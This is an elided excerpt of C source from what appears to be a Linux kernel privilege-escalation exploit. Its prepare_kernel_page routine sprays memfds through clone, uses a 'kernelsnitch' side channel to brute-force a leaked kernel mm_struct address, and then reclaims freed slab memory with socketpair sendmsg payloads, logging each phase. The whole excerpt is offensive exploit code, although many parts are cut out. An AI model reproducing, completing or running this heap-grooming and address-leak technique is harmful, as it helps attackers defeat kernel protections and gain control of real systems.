...
void cleanup_page_prepare_state(void) {
  ...
  free(skb_buf);
  skb_buf = NULL;
  /* brief yield for kernel to reclaim */
  usleep(100000);
}
...
static uintptr_t prepare_kernel_page(int payload_mode) {
  pr_info("prepare: phase0 cleanup\n");
  fflush(stdout);
  ...
  pr_info("prepare: phase1 cloneA prepare=%zu spray=%zu\n",
          prepare_ctx.mm_cnt, spray_ctx.mm_cnt);
  fflush(stdout);
  ...
  pr_info("prepare: phase1 done\n");
  fflush(stdout);

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  pr_info("prepare: phase2 ks_setup cpu_count=%d\n", cpu_count);
  fflush(stdout);
  ks = kernelsnitch_setup(
      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 1, 0);

  pr_info("prepare: phase3 cloneB pre=%zu post=%zu\n",
          pre_ctx.mm_cnt, post_ctx.mm_cnt);
  fflush(stdout);
  for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
    pre_ctx.memfds[i] = clone_memfd();
  }
  pr_info("prepare: phase3a leak_child\n");
  fflush(stdout);
  pid_t leak_child = clone_leak_child();
  pr_info("prepare: phase3b post\n");
  fflush(stdout);
  ...
  pr_info("prepare: phase3 done\n");
  fflush(stdout);

  pr_info("prepare: phase4 ks_check\n");
  fflush(stdout);
  if (!kernelsnitch_found_collisions(ks)) {
    pr_info("prepare: phase4 no collisions\n");
    fflush(stdout);
  ...
  pr_info("prepare: phase5 ks_bruteforce\n");
  fflush(stdout);
  kernelsnitch_bruteforce(ks);
  uintptr_t leaked = ks->mm_struct;
  if (leaked == (uintptr_t)-1) {
    pr_info("prepare: phase5 bruteforce failed\n");
    fflush(stdout);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    close(leak_memfd);
  ...
  pr_info("prepare: phase6 leaked=%016lx\n", leaked);
  fflush(stdout);
  ...
  if (slab_off % MM_STRUCT_SZ != 0 || leaked_slot >= mm_objs_per_slab ||
    ...
    pr_info("prepare: phase6 payload/slot fail\n");
    fflush(stdout);
    kernelsnitch_cleanup(ks);
    ks = NULL;
    close(leak_memfd);
  ...
  pr_info("prepare: phase7 sockpair reclaim\n");
  fflush(stdout);
  ...
  if (sendmsg(shaping_sv[0], &msg, 0) != (ssize_t)SKB_RECLAIM_SIZE) {
    pr_info("prepare: phase7 shaping send fail\n");
    fflush(stdout);
    close(shaping_sv[0]);
    close(shaping_sv[1]);
    kernelsnitch_cleanup(ks);
  ...
  pr_info("prepare: phase8 free holes\n");
  fflush(stdout);
  pin_to_core(CORE);
  for (int i = 0; i < 4; i++) {
    sched_yield();
  ...
  pr_info("prepare: phase9 reclaim sends\n");
  fflush(stdout);
  int reclaim_ok = 1;
  ...
  pr_info("prepare: phase10 cleanup return\n");
  fflush(stdout);
  kernelsnitch_cleanup(ks);
  ks = NULL;
  close_ctx_memfds(&prepare_ctx);
